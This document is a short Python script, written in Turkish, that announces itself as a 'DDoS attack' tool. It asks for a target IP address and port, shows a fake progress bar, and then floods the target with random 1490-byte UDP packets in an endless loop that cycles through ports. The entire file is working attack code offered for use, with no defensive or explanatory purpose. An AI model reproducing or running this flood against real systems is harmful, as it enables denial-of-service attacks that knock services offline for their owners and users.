import sys
import os
import time
import socket
import random

#Kod Zamanı
from datetime import datetime
şimdi = datetime.now()
saat = şimdi.hour
dakika = şimdi.minute
gün = şimdi.day
ay = şimdi.month
yıl = şimdi.year

##############
soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
baytlar = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Saldırısı")
print
ip = raw_input("IP Hedefi : ")
port = input("Port : ")

os.system("clear")
os.system("figlet Saldırı Başlatılıyor")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
gönderilen = 0
while True:
  soket.sendto(baytlar, (ip,port))
  gönderilen = gönderilen + 1
  port = port + 1
  print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
  if port == 65534:
       port = 1